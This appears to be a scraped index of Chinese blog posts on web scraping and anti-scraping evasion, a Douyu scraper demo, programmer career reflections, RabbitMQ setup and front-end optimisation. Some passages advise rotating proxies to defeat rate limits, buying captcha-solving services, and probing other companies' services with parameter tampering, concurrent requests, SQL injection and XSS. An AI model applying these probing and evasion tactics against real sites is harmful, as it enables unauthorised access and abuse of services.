这块有相对全面深入的理解，这样后面遇到反爬虫才能得心应手，见招拆招 了解 HTML 会使用 HTML 标签构造页面，知道如何解析出 DOM 里标签，提取想要的数据内容 了解 CSS 了解 CSS，会解析出样式里的数据内容 了解 JS 基本 JS 语法，能写能读懂，并了解 JS 库：Jquery，Vue 等，可以对使用开发者工具调试 JS 了解 JSON 了解 JSON 数据，会序列化和反序列化数据，通过解析 JSON 对象获取数据内容 了解 HTTP/HTTPS 能够分析请求信息和响应信息，可以通过代码构造请求 会正则解析 通过正则匹配出符合规则的字符串，提取想要的数据内容 会数据库操作 通过数据库操作对爬取数据进行存储，如：MYSQL 语法 会使用抓包工具 浏览器 F12 开发者调试工具(推荐：谷歌),Network(网络)栏目可以获取抓包信息 工具：Charles，Fiddler (可抓包 HTTPS，抓包 APP) 通过抓包工具可以过滤出数据接口或者地址，并且分析请求信息和响应信息，定位数据所在的字段或者 HTML 标签 会使用开发者工具 浏览器 F12 开启开发者工具 需要会使用开发者工具调试 HTML，CSS，JS 会模拟请求 工具：Charles，Fiddler，Postman 通过模拟请求，分析出请求需要那些必要的信息，如：参数，COOKIE，请求头，懂得怎么模拟请求就知道编码的时候如何去构造 能定位数据 数据在 API 中：前端/原生 APP 请求数据 API，API 返回数据大部分是 JSON 格式，然后渲染展示 数据在 HTML 中：查看页面 HTML 源代码，如果源代码里有想要获取的数据，就说明在服务端已经绑定好数据在 HTML 里 数据在 JS 代码中：查看页面 HTML 源代码，如果获取数据不在 HTML 里，又没有请求数据 API，可以看下数据是不是绑定到 JS 变量里 会部署 可以部署到 Windows 或者 Linux 服务器，使用工具进行爬虫进程监控，然后进行定时轮训爬取 反爬虫对抗技巧 反爬虫可以分为服务端限制和前端限制 服务端限制：服务器端行请求限制，防止爬虫进行数据请求 前端限制：前端通过 CSS 和 HTML 标签进行干扰混淆关键数据，防止爬虫轻易获取数据 设置请求头（服务端限制） Referer User-Agent … … 签名规则（服务端限制） 如果是 JS 发起的请求，签名规则可以在 JS 函数中找到，然后再根据规则去构造签名 如果是 APP 发起的请求，可能是前端调用原生封装的方法，或者原生发起的，这个就比较无解，需要反编译 APP 包，也不一定能成功 延迟，或者随机延迟（服务端限制） 如果请求被限制，建议可以试试请求延迟，具体延迟 xxx 毫秒/x 秒，根据实际情况设定合适的时间 代理 IP（服务端限制） 如果延迟请求还是被限制，或者需要延迟很长时间才不会被限制，那就可以考虑使用代理 IP，根据实际场景与限制的规律去运用，一般只要被限制的时候就切换请求的代理 IP，这样就基本可以绕过限制 目前有很多收费的代理 IP 服务平台，有各种服务方式，具体可以搜索了解下，费用一般都在可以接受的范围 登录限制（服务端限制） 请求带上登录用户的 COOKIE 信息 如果登录用户 COOKIE 信息会在固定周期内失效，那就要找到登录接口，模拟登录，存储 COOKIE，然后再发起数据请求，COOKIE 失效后重新这个步骤 验证码限制（服务端限制） 简单验证码，对图片里的字母或者数字进行识别读取，使用识图的模块包可以实现 复杂验证码，无法通过识图识别，可以考虑使用第三方收费服务 CSS/HTML 混淆干扰限制（前端限制） 前端通过 CSS 或者 HTML 标签进行干扰混淆关键数据，破解需要抽样分析，找到规则，然后替换成正确的数据 1 . font-face，自定义字体干扰 如列子：汽车 X 家论帖子，猫 X 电影电影评分 \u003c!--css--\u003e \u003c!--找到：//k3.autoimg.cn/g13/M05/D3/23/wKjByloAOg6AXB-hAADOwImCtp047..ttf--\u003e \u003cstyle\u003e @font-face { font-family: \"myfont\"; src: url(\"//k2.autoimg.cn/g13/M08/D5/DD/wKgH41oAOg6AMyIvAADPhhJcHCg43..eot\"); src: url(\"//k3.autoimg.cn/g13/M08/D5/DD/wKgH41oAOg6AMyIvAADPhhJcHCg43..eot?#iefix\") format(\"embedded-opentype\"), url(\"//k3.autoimg.cn/g13/M05/D3/23/wKjByloAOg6AXB-hAADOwImCtp047..ttf\") format(\"woff\"); } \u003c/style\u003e \u003c!--html--\u003e \u003c!--会员招募中--\u003e \u003cdiv\u003e \u0026nbsp;Mercedes\u0026nbsp;C+\u0026nbsp;会员招募\u003cspan style=\"font-family: myfont;\" \u003e\u0026#xf159;\u003c/span \u003e \u003c/div\u003e \u003c!-- 从html中获取【html中文编码】=\u0026#xf159 然后解析ttf文件得到【ttf中文编码】列表 匹配发现【ttf中文编码】=uniF159可以与【html中文编码】=\u0026#xf159匹配，在第7个，第7个中文就是\"中\" （抽样分析会发现ttf中中文位置是固定的，中文编码是动态变化的，所以只要映射出【ttf中文编码】索引就可以知道中文字符了） --\u003e 破解思路： 找到 ttf 字体文件地址，然后下载下来，使用 font 解析模块包对 ttf 文件进行解析，可以解析出一个字体编码的集合，与 dom 里的文字编码进行映射，然后根据编码在 ttf 里的序号进行映射出中文 可以使用 FontForge/FontCreator 工具打开 ttf 文件进行分析 2 . 伪元素隐藏式 通过伪元素来显示重要数据内容 如例子：汽车 X 家 \u003c!--css--\u003e \u003cstyle\u003e .hs_kw60_configod::before { content: \"一汽\"; } .hs_kw23_configod::before { content: \"大众\"; } .hs_kw26_configod::before { content: \"奥迪\"; } \u003c/style\u003e \u003c!--html--\u003e \u003cdiv\u003e \u003cspan class=\"hs_kw60_configod\"\u003e\u003c/span\u003e - \u003cspan class=\"hs_kw23_configod\"\u003e\u003c/span\u003e \u003cspan class=\"hs_kw26_configod\"\u003e\u003c/span\u003e \u003c/div\u003e 破解思路： 找到样式文件，然后根据 HTML 标签里 class 名称，匹配出 CSS 里对应 class 中 content 的内容进行替换 3 . backgroud-image 通过背景图片的 position 位置偏移量，显示数字/符号，如：价格，评分等 根据 backgroud-postion 值和图片数字进行映射 4 . html 标签干扰 通过在重要数据的标签里加入一些有的没的隐藏内容的标签，干扰数据的获取 如例子：xxIP 代理平台 \u003c!--html--\u003e \u003ctd class=\"ip\"\u003e \u003cp style=\"display:none;\"\u003e2\u003c/p\u003e \u003cspan\u003e2\u003c/span\u003e \u003cspan style=\"display:inline-block;\"\u003e\u003c/span\u003e \u003cdiv style=\"display: inline-block;\"\u003e02\u003c/div\u003e \u003cp style=\"display:none;\"\u003e.1","date":"2018-02-27","objectID":"/posts/2018-02-27-spider-practice/:0:0","tags":["爬虫"],"title":"大话爬虫的实践技巧","uri":"/posts/2018-02-27-spider-practice/"},{"categories":null,"content":"程序员大军鱼龙混杂，水平的高低无法简单的从一个功能完成情况来评定，同样一个需求，功能都可以完成，但是不同程序员完成质量会不一样，完成质量的好坏需要从多方面评定，可以参考这些条件：易维护，易拓展，高可用，高稳定，高性能，安全性，容错，风控 洞察身边的程序猿，可以归类出这几种类型： 理论型，理论能力很强，对前沿技术略有了解，性格比较强势，需求分析和方案设计头头是道，对自己的设计的内容比较自信固执，反观代码，质量差的一匹，逻辑乱，难维护难拓展，但是往往这种在公司评级还都挺高 潜力型，业务能力强，开发设计和问题排查思路清晰，可以提出优化/改进方案，能对业务适当抽象，自我技术要求比较高，代码质量好，平时会调研前沿技术 表面型，业务需求基本都可以完成，但是代码质量比较差，bug多，问题排查效率低，难维护难拓展，很少了解前沿技术，空闲时间就刷刷微博，看新闻，聊天 老实型，做事勤勤恳恳，代码质量一般，平时表现比较不起眼，与同事沟通少，业余时间也不清楚具体在做什么 大神型，总结就是各方面都很NB，问啥都能给予建议或者解决方案，但是这种人很少 服务端开发工程师应该具有哪些能力？ 身处互联网公司的后端开发，所以用一个后端开发者角度出发 基础能力 代码规范 分层清晰 逻辑清晰 数据库操作 了解http，能抓包工具和模拟请求工具 了解前端/js，能使用浏览器控制台工具调试 安全预防 sql 注入 xss 跨站脚本攻击 csrf 跨站请求伪造 http 劫持 ddos 攻击 … … 高级能力 面向抽象编程 适当使用设计模式 模块封装 异步编程 多线程编程 经验 高并发处理/优化 性能优化(加载速度、提高接口tps 、… … 解析需求，能给予合理的建议和解决方案 能灵活使用缓存：redis，memcache 等 能灵活使用消息队列中间件：rabbitmq，activemq，zeromq，kafka，等 辅助能力 爬虫 能开发爬虫功能就代表对web这块已经掌握比较好 攻击别人业务(适可而止，自行把握) 手段 模拟请求，寻找突破口，如：修改参数 并发请求，导致并发逻辑问题。如：获得多签到积分（多数据操作接口可能会压垮服务器） 尝试攻击，sql注入，跨站脚本攻击，等 … … 懂得攻击别人，自己就知道如何防御 沟通能力 成员沟通，讨论设计方案，分享思路，技术点 协作沟通，主动性很重要 排错能力 问题反馈快速响应 根据问题现象快速定位问题 快速给出解决方案并上线，告知客服，反馈给用户 学习能力 调研前沿技术并且最好是可以运用到项目业务中 多语言开发：python，java，nodejs，php … … 开发语言只是完成业务开发的工具，学习并在项目实践，这样才能从中学到东西 预知能力 代码未来，方便业务拓展 架构未来，方便架构拓展支撑业务增长 架构能力 分层 分割 分布式 缓存 集群 异步 沉余 自动化 安全 坏代码味道 列出曾经遇到的比较典型的坏代码味道截图，引以为戒，BGM（“多么痛的领悟”），醒醒吧，别把自己想的多牛逼，先从代码质量开始，拿着高薪，写着学生水平的代码人到处都是，遇到这样的代码请问要怎么拓展？ 坏味道1 (分层不清，在控制层拼接sql) 坏味道2 (函数参数过多) 坏味道3 (过分深层) 坏味道4 (相同功能需要提取函数+过分深层) 总结： 无论你是什么类型的程序员，期望你能够对得住自己在岗位的这份责任 多反思自省，反观以前的代码，肯定也是有些不合理的设计，总结并且沉淀 2018 新的一年，上班第一天，比较空闲，重新整理了下心情，拾起待写的博文，把它完成，期望新一年我可以有更多的沉淀 ","date":"2018-02-22","objectID":"/posts/2018-02-22-dh-cxy/:0:0","tags":["程序员"],"title":"大话来自一个程序员的反思","uri":"/posts/2018-02-22-dh-cxy/"},{"categories":["爬虫"],"content":"什么是爬虫？ 网络爬虫也叫网络蜘蛛，如果把互联网比喻成一个蜘蛛网，那么蜘蛛就是在网上爬来爬去的蜘蛛，爬虫程序通过请求 url 地址，根据响应的内容进行解析采集数据， 比如：如果响应内容是 html，分析 dom 结构，进行 dom 解析、或者正则匹配，如果响应内容是 xml/json 数据，就可以转数据对象，然后对数据进行解析。 ","date":"2017-09-25","objectID":"/posts/2017-09-25-spider/:0:1","tags":["爬虫"],"title":"大话爬虫的基本套路","uri":"/posts/2017-09-25-spider/"},{"categories":["爬虫"],"content":"有什么作用？ 通过有效的爬虫手段批量采集数据，可以降低人工成本，提高有效数据量，给予运营/销售的数据支撑，加快产品发展。 ","date":"2017-09-25","objectID":"/posts/2017-09-25-spider/:0:2","tags":["爬虫"],"title":"大话爬虫的基本套路","uri":"/posts/2017-09-25-spider/"},{"categories":["爬虫"],"content":"业界的情况 目前互联网产品竞争激烈，业界大部分都会使用爬虫技术对竞品产品的数据进行挖掘、采集、大数据分析，这是必备手段，并且很多公司都设立了爬虫工程师的岗位 ","date":"2017-09-25","objectID":"/posts/2017-09-25-spider/:0:3","tags":["爬虫"],"title":"大话爬虫的基本套路","uri":"/posts/2017-09-25-spider/"},{"categories":["爬虫"],"content":"合法性 爬虫是利用程序进行批量爬取网页上的公开信息，也就是前端显示的数据信息。因为信息是完全公开的，所以是合法的。其实就像浏览器一样，浏览器解析响应内容并渲染为页面，而爬虫解析响应内容采集想要的数据进行存储。 ","date":"2017-09-25","objectID":"/posts/2017-09-25-spider/:0:4","tags":["爬虫"],"title":"大话爬虫的基本套路","uri":"/posts/2017-09-25-spider/"},{"categories":["爬虫"],"content":"反爬虫 爬虫很难完全的制止，道高一尺魔高一丈，这是一场没有硝烟的战争，码农 VS 码农 反爬虫一些手段： 合法检测：请求校验(useragent，referer，接口加签名，等) 小黑屋：IP/用户限制请求频率，或者直接拦截 投毒：反爬虫高境界可以不用拦截，拦截是一时的，投毒返回虚假数据，可以误导竞品决策 … … ","date":"2017-09-25","objectID":"/posts/2017-09-25-spider/:0:5","tags":["爬虫"],"title":"大话爬虫的基本套路","uri":"/posts/2017-09-25-spider/"},{"categories":["爬虫"],"content":"爬虫基本套路 基本流程 目标数据 来源地址 结构分析 实现构思 操刀编码 基本手段 破解请求限制 请求头设置，如：useragant 为有效客户端 控制请求频率(根据实际情景) IP 代理 签名/加密参数从 html/cookie/js 分析 破解登录授权 请求带上用户 cookie 信息 破解验证码 简单的验证码可以使用识图读验证码第三方库 解析数据 HTML Dom 解析 正则匹配，通过的正则表达式来匹配想要爬取的数据，如：有些数据不是在 html 标签里，而是在 html 的 script 标签的 js 变量中 使用第三方库解析 html dom，比较喜欢类 jquery 的库 数据字符串 正则匹配(根据情景使用) 转 JSON/XML 对象进行解析 ","date":"2017-09-25","objectID":"/posts/2017-09-25-spider/:0:6","tags":["爬虫"],"title":"大话爬虫的基本套路","uri":"/posts/2017-09-25-spider/"},{"categories":["爬虫"],"content":"python 爬虫 python 写爬虫的优势 python 语法易学，容易上手 社区活跃，实现方案多可参考 各种功能包丰富 少量代码即可完成强大功能 涉及模块包 请求 urllib urllib2 cookielib 多线程 threading 正则 re json 解析 json html dom 解析 pyquery beautiful soup 操作浏览器 selenium ","date":"2017-09-25","objectID":"/posts/2017-09-25-spider/:0:7","tags":["爬虫"],"title":"大话爬虫的基本套路","uri":"/posts/2017-09-25-spider/"},{"categories":["爬虫"],"content":"实例解析 斗鱼主播排行 目标数据 获取排行榜主播信息 来源地址 [排行榜地址] https://www.douyu.com/directory/rank_list/game [主播房间地址] https://www.douyu.com/xxx xxx=房间号 结构分析 通过抓包 [排行榜地址]，[主播房间地址] （谷歌调试 network/charles/fiddler） 获得排行数据接口：https://www.douyu.com/directory/rank_list/game 参数确认(去掉不必要参数) cookie 确认(去掉不必要 cookie) 模拟请求(charles/fiddler/postman) 获得主播房间信息数据 发现$ROOM 是主播房间信息，在页面的 script 标签的 js 变量中，可使用正则工具写表达式去匹配 实现构思 通过请求 [主播排行接口] 获取 [排行榜数据] [排行榜数据] 中有主播房间号，可以通过拼接获得 [主播房间地址] 请求 [主播房间地址] 可以获得 [$ROOM 信息] ，解析可以获得主播房间信息 操刀编码 申明：此例子仅作为爬虫学习 DEMO，并无其他利用 基于 python 实现爬虫学习基础 demo def douyu_rank(rankName, statType): ''' 斗鱼主播排行数据抓取 [数据地址](https://www.douyu.com/directory/rank_list/game) * `rankName` anchor(巨星主播榜),fans(主播粉丝榜),haoyou(土豪实力榜),user(主播壕友榜) * `statType` day(日),week(周),month(月) ''' if not isinstance(rankName, ERankName): raise Exception(\"rankName 类型错误，必须是ERankName枚举\") if not isinstance(statType, EStatType): raise Exception(\"statType 类型错误，必须是EStatType枚举\") rankName = '%sListData' % rankName.name statType = '%sListData' % statType.name # 请求获取html源码 rs = rq.get( \"https://www.douyu.com/directory/rank_list/game\", headers={'User-Agent': 'Mozilla/5.0'}) # 正则解析出数据 mt = re.search(r'rankListData\\s+?=(.*?);', rs, re.S) if (not mt): print u\"无法解析rankListData数据\" return grps = mt.groups() # 数据转json rankListDataStr = grps[0] rankListData = json.loads(rankListDataStr) dayList = rankListData[rankName][statType] # 修改排序 dayList.sort(key=lambda k: (k.get('id', 0)), reverse=False) return dayList def douyu_room(romm_id): ''' 主播房间信息解析 [数据地址](https://www.douyu.com/xxx) 'romm_id' 主播房号 ''' rs = rq.get( (\"https://www.douyu.com/%s\" % romm_id), headers={'User-Agent': 'Mozilla/5.0'}) mt = re.search(r'\\$ROOM\\s+?=\\s+?({.*?});', rs, re.S) if (not mt): print u\"无法解析ROOM数据\" return grps = mt.groups() roomDataStr = grps[0] roomData = json.loads(roomDataStr) return roomData def run(): ''' 测试爬虫 ''' datas = douyu_rank(ERankName.anchor, EStatType.month) print '\\r\\n主播排行榜：' for item in datas: room_id = item['room_id'] roomData = douyu_room(room_id) rommName = None if roomData is not None: rommName = roomData['room_name'] roomInfo = (u'房间(%s):%s' % (item['room_id'], rommName)) print item['id'], item[ 'nickname'], roomInfo, '[' + item['catagory'] + ']' run() 运行结果： 主播排行榜： 无法解析ROOM数据 1 冯提莫 房间(71017):None [英雄联盟] 2 阿冷aleng丶 房间(2371789):又是我最喜欢的阿冷ktv时间～ [英雄联盟] 3 胜哥002 房间(414818):胜哥：南通的雨下的我好心累。 [DNF] 4 White55开解说 房间(138286):卢本伟五五开 每天都要很强 [英雄联盟] 5 东北大鹌鹑 房间(96291):东北大鹌鹑 宇宙第一寒冰 相声艺术家！ [英雄联盟] 6 老实敦厚的笑笑 房间(154537):德云色 给兄弟们赔个不是 [英雄联盟] 7 刘飞儿faye 房间(265438):刘飞儿 月底吃鸡 大吉大利 [绝地求生] 8 pigff 房间(24422):【PIGFF】借基地直播，没OW [守望先锋] 9 云彩上的翅膀 房间(28101):翅：还是抽天空套刺激！ [DNF] 10 yyfyyf 房间(58428):无尽的9月，杀 [DOTA2] # 冯提莫 房间做周年主题，解析会有问题 Demo 源码地址 ","date":"2017-09-25","objectID":"/posts/2017-09-25-spider/:0:8","tags":["爬虫"],"title":"大话爬虫的基本套路","uri":"/posts/2017-09-25-spider/"},{"categories":["MQ"],"content":"介绍 RabbitMQ 是一个由 erlang 开发的基于 AMQP（Advanced Message Queue）协议的开源实现。用于在分布式系统中存储转发消息，在易用性、扩展性、高可用性等方面都非常的优秀。是当前最主流的消息中间件之一。 RabbitMQ 的官方 概念： Brocker：消息队列服务器实体。 Exchange：消息交换机，指定消息按什么规则，路由到哪个队列。 Queue：消息队列，每个消息都会被投入到一个或者多个队列里。 Binding：绑定，它的作用是把 exchange 和 queue 按照路由规则 binding 起来。 Routing Key：路由关键字，exchange 根据这个关键字进行消息投递。 Vhost：虚拟主机，一个 broker 里可以开设多个 vhost，用作不用用户的权限分离。 Producer：消息生产者，就是投递消息的程序。 Consumer：消息消费者，就是接受消息的程序。 Channel：消息通道，在客户端的每个连接里，可建立多个 channel，每个 channel 代表一个会话任务。 消息队列的使用过程大概如下： 消息接收 客户端连接到消息队列服务器，打开一个 channel。 客户端声明一个 exchange，并设置相关属性。 客户端声明一个 queue，并设置相关属性。 客户端使用 routing key，在 exchange 和 queue 之间建立好绑定关系。 消息发布 客户端投递消息到 exchange。 exchange 接收到消息后，就根据消息的 key 和已经设置的 binding，进行消息路由，将消息投递到一个或多个队列里。 AMQP 里主要要说两个组件： Exchange 和 Queue 绿色的 X 就是 Exchange ，红色的是 Queue ，这两者都在 Server 端，又称作 Broker 这部分是 RabbitMQ 实现的，而蓝色的则是客户端，通常有 Producer 和 Consumer 两种类型。 Exchange 通常分为四种： fanout：该类型路由规则非常简单，会把所有发送到该 Exchange 的消息路由到所有与它绑定的 Queue 中，相当于广播功能 direct：该类型路由规则会将消息路由到 binding key 与 routing key 完全匹配的 Queue 中 topic：与 direct 类型相似，只是规则没有那么严格，可以模糊匹配和多条件匹配 headers：该类型不依赖于 routing key 与 binding key 的匹配规则来路由消息，而是根据发送的消息内容中的 headers 属性进行匹配 使用场景 官方介绍 ","date":"2017-08-03","objectID":"/posts/2017-08-03-rabbitmq-demo/:0:1","tags":["RabbitMQ"],"title":"RabbitMQ入门与使用篇","uri":"/posts/2017-08-03-rabbitmq-demo/"},{"categories":["MQ"],"content":"下载与安装 下载 rabbitmq erlang 安装 先安装 erlang 然后再安装 rabbitmq ","date":"2017-08-03","objectID":"/posts/2017-08-03-rabbitmq-demo/:0:2","tags":["RabbitMQ"],"title":"RabbitMQ入门与使用篇","uri":"/posts/2017-08-03-rabbitmq-demo/"},{"categories":["MQ"],"content":"管理工具 参考官方文档 操作起来很简单，只需要在 DOS 下面，进入安装目录（安装路径\\RabbitMQ Server\\rabbitmq_server-3.2.2\\sbin）执行如下命令就可以成功安装。 rabbitmq-plugins enable rabbitmq_management 可以通过访问：http://localhost:15672进行测试，默认的登陆账号为：guest，密码为：guest。 ","date":"2017-08-03","objectID":"/posts/2017-08-03-rabbitmq-demo/:0:3","tags":["RabbitMQ"],"title":"RabbitMQ入门与使用篇","uri":"/posts/2017-08-03-rabbitmq-demo/"},{"categories":["MQ"],"content":"其他配置 1. 安装完以后 erlang 需要手动设置 ERLANG_HOME 的系统变量。 set ERLANG_HOME=F:\\Program Files\\erl9.0 #环境变量`path`里加入：%ERLANG_HOME%\\bin #环境变量`path`里加入: 安装路径\\RabbitMQ Server\\rabbitmq_server-3.6.10\\sbin 2．激活 Rabbit MQ’s Management Plugin 使用 Rabbit MQ 管理插件，可以更好的可视化方式查看 Rabbit MQ 服务器实例的状态，你可以在命令行中使用下面的命令激活。 rabbitmq-plugins.bat enable rabbitmq_management 3．创建管理用户 rabbitmqctl.bat add_user sa 123456 4. 设置管理员 rabbitmqctl.bat set_user_tags sa administrator 5．设置权限 rabbitmqctl.bat set_permissions -p / sa \".*\" \".*\" \".*\" 6. 其他命令 #查询用户： rabbitmqctl.bat list_users #查询vhosts： rabbitmqctl.bat list_vhosts #启动RabbitMQ服务: net stop RabbitMQ \u0026\u0026 net start RabbitMQ 以上这些，账号、vhost、权限、作用域等基本就设置完了。 ","date":"2017-08-03","objectID":"/posts/2017-08-03-rabbitmq-demo/:1:1","tags":["RabbitMQ"],"title":"RabbitMQ入门与使用篇","uri":"/posts/2017-08-03-rabbitmq-demo/"},{"categories":["MQ"],"content":"基于.net 使用 RabbitMQ.Client 是 RabbiMQ 官方提供的的客户端 EasyNetQ 是基于 RabbitMQ.Client 基础上封装的开源客户端,使用非常方便 以下操作 RabbitMQ 的代码例子，都是基于 EasyNetQ 的使用和再封装，在文章底部有demo 例子的源码下载地址 创建 IBus /// \u003csummary\u003e /// 消息服务器连接器 /// \u003c/summary\u003e public class BusBuilder { public static IBus CreateMessageBus() { // 消息服务器连接字符串 // var connectionString = ConfigurationManager.ConnectionStrings[\"RabbitMQ\"]; string connString = \"host=127.0.0.1:5672;virtualHost=TestQueue;username=sa;password=123456\"; if (connString == null || connString == string.Empty) throw new Exception(\"messageserver connection string is missing or empty\"); return RabbitHutch.CreateBus(connString); } } Fanout Exchange 所有发送到 Fanout Exchange 的消息都会被转发到与该 Exchange 绑定(Binding)的所有 Queue 上。 Fanout Exchange 不需要处理 RouteKey 。只需要简单的将队列绑定到 exchange 上。这样发送到 exchange 的消息都会被转发到与该交换机绑定的所有队列上。类似子网广播，每台子网内的主机都获得了一份复制的消息。 所以，Fanout Exchange 转发消息是最快的。 /// \u003csummary\u003e /// 消息消耗（fanout） /// \u003c/summary\u003e /// \u003ctypeparam name=\"T\"\u003e消息类型\u003c/typeparam\u003e /// \u003cparam name=\"handler\"\u003e回调\u003c/param\u003e /// \u003cparam name=\"exChangeName\"\u003e交换器名\u003c/param\u003e /// \u003cparam name=\"queueName\"\u003e队列名\u003c/param\u003e /// \u003cparam name=\"routingKey\"\u003e路由名\u003c/param\u003e public static void FanoutConsume\u003cT\u003e(Action\u003cT\u003e handler, string exChangeName = \"fanout_mq\", string queueName = \"fanout_queue_default\", string routingKey = \"\") where T : class { var bus = BusBuilder.CreateMessageBus(); var adbus = bus.Advanced; var exchange = adbus.ExchangeDeclare(exChangeName, ExchangeType.Fanout); var queue = CreateQueue(adbus, queueName); adbus.Bind(exchange, queue, routingKey); adbus.Consume(queue, registration =\u003e { registration.Add\u003cT\u003e((message, info) =\u003e { handler(message.Body); }); }); } /// \u003csummary\u003e /// 消息上报（fanout） /// \u003c/summary\u003e /// \u003ctypeparam name=\"T\"\u003e消息类型\u003c/typeparam\u003e /// \u003cparam name=\"topic\"\u003e主题名\u003c/param\u003e /// \u003cparam name=\"t\"\u003e消息命名\u003c/param\u003e /// \u003cparam name=\"msg\"\u003e错误信息\u003c/param\u003e /// \u003creturns\u003e\u003c/returns\u003e public static bool FanoutPush\u003cT\u003e(T t, out string msg, string exChangeName = \"fanout_mq\", string routingKey = \"\") where T : class { msg = string.Empty; try { using (var bus = BusBuilder.CreateMessageBus()) { var adbus = bus.Advanced; var exchange = adbus.ExchangeDeclare(exChangeName, ExchangeType.Fanout); adbus.Publish(exchange, routingKey, false, new Message\u003cT\u003e(t)); return true; } } catch (Exception ex) { msg = ex.ToString(); return false; } } 所有发送到 Direct Exchange 的消息被转发到 RouteKey 中指定的 Queue。 Direct 模式，可以使用 RabbitMQ 自带的 Exchange：default Exchange 。所以不需要将 Exchange 进行任何绑定(binding)操作 。消息传递时，RouteKey 必须完全匹配，才会被队列接收，否则该消息会被抛弃。 /// \u003csummary\u003e /// 消息发送（direct） /// \u003c/summary\u003e /// \u003ctypeparam name=\"T\"\u003e消息类型\u003c/typeparam\u003e /// \u003cparam name=\"queue\"\u003e发送到的队列\u003c/param\u003e /// \u003cparam name=\"message\"\u003e发送内容\u003c/param\u003e public static void DirectSend\u003cT\u003e(string queue, T message) where T : class { using (var bus = BusBuilder.CreateMessageBus()) { bus.Send(queue, message); } } /// \u003csummary\u003e /// 消息接收（direct） /// \u003c/summary\u003e /// \u003ctypeparam name=\"T\"\u003e消息类型\u003c/typeparam\u003e /// \u003cparam name=\"queue\"\u003e接收的队列\u003c/param\u003e /// \u003cparam name=\"callback\"\u003e回调操作\u003c/param\u003e /// \u003cparam name=\"msg\"\u003e错误信息\u003c/param\u003e /// \u003creturns\u003e\u003c/returns\u003e public static bool DirectReceive\u003cT\u003e(string queue, Action\u003cT\u003e callback, out string msg) where T : class { msg = string.Empty; try { var bus = BusBuilder.CreateMessageBus(); bus.Receive\u003cT\u003e(queue, callback); } catch (Exception ex) { msg = ex.ToString(); return false; } return true; } /// \u003csummary\u003e /// 消息发送 /// \u003c![CDATA[（direct EasyNetQ高级API）]]\u003e /// \u003c/summary\u003e /// \u003ctypeparam name=\"T\"\u003e\u003c/typeparam\u003e /// \u003cparam name=\"t\"\u003e\u003c/param\u003e /// \u003cparam name=\"msg\"\u003e\u003c/param\u003e /// \u003cparam name=\"exChangeName\"\u003e\u003c/param\u003e /// \u003cparam name=\"routingKey\"\u003e\u003c/param\u003e /// \u003creturns\u003e\u003c/returns\u003e public static bool DirectPush\u003cT\u003e(T t, out string msg, string exChangeName = \"direct_mq\", string routingKey = \"direct_rout_default\") where T : class { msg = string.Empty; try { using (var bus = BusBuilder.CreateMessageBus()) { var adbus = bus.Advanced; var exchange = adbus.ExchangeDeclare(exChangeName, ExchangeType.Direct); adbus.Publish(exchange, routingKey, false, new Message\u003cT\u003e(t)); return true; } } catch (Exception ex","date":"2017-08-03","objectID":"/posts/2017-08-03-rabbitmq-demo/:1:2","tags":["RabbitMQ"],"title":"RabbitMQ入门与使用篇","uri":"/posts/2017-08-03-rabbitmq-demo/"},{"categories":["MQ"],"content":"注意 当在创建订阅者去消费队列的时候 /// \u003csummary\u003e /// 获取主题 /// \u003c/summary\u003e /// \u003cparam name=\"topic\"\u003e\u003c/param\u003e public static void GetSub\u003cT\u003e(T topic, Action\u003cT\u003e callback) where T : class { using (var bus = BusBuilder.CreateMessageBus()) { bus.Subscribe\u003cT\u003e(topic.ToString(), callback, x =\u003e x.WithTopic(topic.ToString())); } } using 里的对象在执行完成后被回收了，导致刚连接上去就又断开了(刚开始写的时候，习惯性加 using，排查了好久才发现，欲哭无泪) 源码项目运行前的准备与确认： 到 RabbitMQ 管理后台添加TestQueueVHost，并且分配用户权限，然后到RabbitMQHelper.BusBuilder类里配置 RabbitMQ 连接服务的相关信息 host=127.0.0.1:5672;virtualHost=TestQueue;username=sa;password=123456，（根据配置的内容和用户修改） 参考资料(鸣谢)： EasyNetQ-基于 Topic 的路由 .NET 操作 RabbitMQ 组件 EasyNetQ 使用中文简版文档。 RabbitMQ 入门指南 附：Demo 源码GitHub 地址 Star ","date":"2017-08-03","objectID":"/posts/2017-08-03-rabbitmq-demo/:1:3","tags":["RabbitMQ"],"title":"RabbitMQ入门与使用篇","uri":"/posts/2017-08-03-rabbitmq-demo/"},{"categories":["前端"],"content":"前言 前端性能优化这是一个老生常谈的话题，但是还是有很多人没有真正的重视起来，或者说还没有产生这种意识。 当用户打开页面，首屏加载速度越慢，流失用户的概率就越大，在体验产品的时候性能和交互对用户的影响是最直接的，推广拉新是一门艺术，用户的留存是一门技术，拉进来留住用户，产品体验很关键，这里我以美柚的页面为例子，用实例展开说明前端优化的基本套路（适合新手上车）。 ","date":"2017-07-05","objectID":"/posts/2017-07-05-fore-end-optimize/:1:0","tags":["前端"],"title":"大话WEB前端性能优化基本套路","uri":"/posts/2017-07-05-fore-end-optimize/"},{"categories":["前端"],"content":"WEB 性能优化套路 ","date":"2017-07-05","objectID":"/posts/2017-07-05-fore-end-optimize/:2:0","tags":["前端"],"title":"大话WEB前端性能优化基本套路","uri":"/posts/2017-07-05-fore-end-optimize/"},{"categories":["前端"],"content":"基础套路 1：减少资源体积 css 压缩 响应头 GZIP js 压缩 响应头 GZIP html 输出压缩 响应头 GZIP 图片 压缩 使用 Webp 格式 cookie 注意 cookie 体积，合理设置过期时间 ","date":"2017-07-05","objectID":"/posts/2017-07-05-fore-end-optimize/:2:1","tags":["前端"],"title":"大话WEB前端性能优化基本套路","uri":"/posts/2017-07-05-fore-end-optimize/"},{"categories":["前端"],"content":"基础套路 2：控制请求数 js 合并 css 合并 图片 合并 base64(常用图标：如 logo 等) 接口 数量控制 异步 ajax 合理使用缓存机制 浏览器缓存 js 编码 异步加载 js Require.JS 按需加载 lazyload 图片 ","date":"2017-07-05","objectID":"/posts/2017-07-05-fore-end-optimize/:2:2","tags":["前端"],"title":"大话WEB前端性能优化基本套路","uri":"/posts/2017-07-05-fore-end-optimize/"},{"categories":["前端"],"content":"基础套路 3：静态资源 CDN 请求走 CDN html image js css ","date":"2017-07-05","objectID":"/posts/2017-07-05-fore-end-optimize/:2:3","tags":["前端"],"title":"大话WEB前端性能优化基本套路","uri":"/posts/2017-07-05-fore-end-optimize/"},{"categories":["前端"],"content":"综合套路 图片地址独立域名 与业务不同域名可以减少请求头里不必要的 cookie 传输 提高渲染速度 js 放到页面底部，body 标签底部 css 放到页面顶部，head 标签里 代码 代码优化：css/js/html 预加载，如：分页预加载，快滚动到底部的时候以前加载下一页数据 